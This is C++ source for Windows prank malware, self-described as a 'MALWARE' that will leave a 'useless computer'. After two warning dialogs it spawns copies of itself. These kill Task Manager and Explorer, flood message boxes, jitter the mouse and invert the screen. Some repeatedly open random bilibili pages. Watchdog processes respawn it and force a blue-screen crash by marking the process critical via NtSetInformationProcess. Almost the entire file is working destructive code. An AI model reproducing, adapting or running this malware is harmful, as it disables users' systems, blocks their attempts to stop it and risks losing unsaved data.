#include <iostream>
#include "../../resource/tool.h"
using namespace std;
#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")

void FuckerVirusLaunch();

int main() {
	CmdLineA cl(::GetCommandLineA());
	string buf_s;
	if (cl.getopt("virus", buf_s) && buf_s == "fucker") {
		FuckerVirusLaunch();
		return 0;
	}
	int buf_i = 0;
	buf_i = ::MessageBoxW(NULL, L"The application you just executed is a MALWARE.\n"
		"Still run it will destroy your computer.\n"
		"\nIf you accidentally open this program, just click \"No\" and nothing will happen.\n"
		"If you want to get a useless computer, click \"Yes\", and "
		"the author will not be responsible for any loss.\n"
		"\nDo you want to continue executing this malware and get a useless computer?"
		, L"Fuck you", MB_ICONWARNING | MB_YESNO);
	if (buf_i == IDNO) return 0;
	buf_i = ::MessageBoxW(NULL, L"THIS IS THE LAST WARNING!!!\n"
		"\nThe author will NOT be responsible for ANY LOSE!!\n"
		"Really executing this MALWARE and get a USELESS computer?"
		, L"LAST WARNING", MB_ICONWARNING | MB_YESNO | MB_DEFBUTTON2);
	if (buf_i == IDNO) return 0;
	FuckerVirusLaunch();
	return 0;
}


DWORD __stdcall FuckerVirus_TraceFuckBox(void*) {
	MessageBoxA(NULL, "Fuck you", "Fuck you", MB_ICONERROR);
	return 0;
}

void FuckerVirusLaunch() {
	HWND hWnd = NULL;
	CmdLineA cl(GetCommandLineA());
	if (cl.getopt("watchdog")) {
		vector<ProcessInfo> p;
		size_t l = 0, n = 0;
		while (1) {
			Process.flush();
			Process.find(s2ws(GetProgramInfo().name), p);
			n = p.size();
			p.clear();
			if (n < l) {
				Process.StartOnly(s2ws("\"" + GetProgramDir() +
					"\" --virus=fucker --trace-error-box"));
				Sleep(1000);
				Process.StartOnly(s2ws("\"" + GetProgramDir() + "\" --virus=fucker --bsod"));
			}
			else l = n;
			Sleep(1000);
		}
		exit(0);
	}
	if (cl.getopt("trace-error-box")) {
		vector<HANDLE> ths;
		for (int i = 0; i < 16; ++i) {
			ths.push_back(CreateThread(0, 0, FuckerVirus_TraceFuckBox, 0, 0, 0));
		}
		for (auto& i : ths) {
			WaitForSingleObject(i, MAXDWORD);
		}
		exit(0);
	}
	if (cl.getopt("draw_error_icon")) {
		HWND hwnd = GetDesktopWindow();
		EnableWindow(hwnd, 0);
		HDC hdc = 0;
		POINT pos;
		while (1) {
			GetCursorPos(&pos); hdc = GetWindowDC(hwnd);
			DrawIcon(hdc, pos.x, pos.y, LoadIcon(NULL, IDI_ERROR));
			Sleep(1);
		}
		exit(0);
	}
	if (cl.getopt("kichiku_mouse")) {
		POINT pos;
		bool addorsub = false;
		while (1) {
			srand((UINT)time(0));
			GetCursorPos(&pos);
			addorsub = rand() % 2;
			if (addorsub) {
				pos.x += rand() % 5;
				pos.y += rand() % 5;
			}
			else {
				pos.x -= rand() % 5;
				pos.y -= rand() % 5;
			}
			SetCursorPos(pos.x, pos.y);
			Sleep(100);
		}
		exit(0);
	}
	if (cl.getopt("open_bilibili")) {
		while (1) {
			Process.StartOnly(s2ws("explorer https://b23.tv/av" + to_string(rand() % 268435456)));
			Sleep(10000);
		}
		exit(0);
	}
	if (cl.getopt("killtaskmgr")) {
		vector<ProcessInfo> t;
		while (1) {
			Process.flush();
			Process.find(L"taskmgr.exe", t);
			for (auto i : t) Process.kill(i);
			t.clear();
			Sleep(1000);
		}
		exit(0);
	}
	if (cl.getopt("bsod")) {
		ProcessInfo ifo = Process.GetCurrentProcess();
		ULONG key = 1; long res = 0;
		res = Process.NtSetInformationProcess(static_cast<HANDLE>(ifo),
			(PROCESS_INFORMATION_CLASS)29, &key, sizeof(ULONG));
		if (res >= 0) exit(0);
		else ReStart();
		return;
	}
	if (cl.getopt("uncolor")) {
		HWND hwnd = GetDesktopWindow();
		EnableWindow(hwnd, 0);
		HDC hdc = 0;
		RECT screen;
		SystemParametersInfoA(SPI_GETWORKAREA, 0, &screen, SPIF_SENDCHANGE);
		long cw, ch;
		cw = screen.right - screen.left;
		ch = screen.bottom - screen.top;
		while (1) {
			hdc = GetWindowDC(hwnd);
			BitBlt(hdc, 0, 0, cw, ch, hdc, 0, 0, DSTINVERT);
			Sleep(1000);
		}
		exit(0);
	}

	{
		for (int i = 0; i < 6; ++i) {
			Process.StartOnly(s2ws("\"" + GetProgramDir() +
				"\" --virus=fucker --watchdog"));
		}
		Process.StartOnly(s2ws("\"" + GetProgramDir() +
			"\" --virus=fucker --killtaskmgr"));
		Sleep(500);
		Process.StartOnly(s2ws("\"" + GetProgramDir() +
			"\" --virus=fucker --trace-error-box"));
		Process.StartOnly(s2ws("\"" + GetProgramDir() +
			"\" --virus=fucker --draw_error_icon"));
		Sleep(5000);
		Process.StartOnly(s2ws("\"" + GetProgramDir() +
			"\" --virus=fucker --kichiku_mouse"));
		Sleep(5000);
		Process.StartOnly(s2ws("\"" + GetProgramDir() +
			"\" --virus=fucker --open_bilibili"));
		Sleep(5000);
		Process.StartOnly(s2ws("\"" + GetProgramDir() +
			"\" --virus=fucker --open_bilibili"));
		Sleep(5000);
		Process.StartOnly(s2ws("\"" + GetProgramDir() +
			"\" --virus=fucker --open_bilibili"));
		Sleep(6000);
		Process.StartOnly(s2ws("\"" + GetProgramDir() +
			"\" --virus=fucker --uncolor"));
		Sleep(262144);
		vector<ProcessInfo> vh;
		Process.find(L"explorer.exe", vh);
		for (auto j : vh) Process.kill(j);
		Sleep(5000);
		Process.StartOnly(s2ws("\"" + GetProgramDir() + "\" --virus=fucker --bsod"));
		//ExitWindowsEx(EWX_FORCE | EWX_POWEROFF, 0);
	}
}
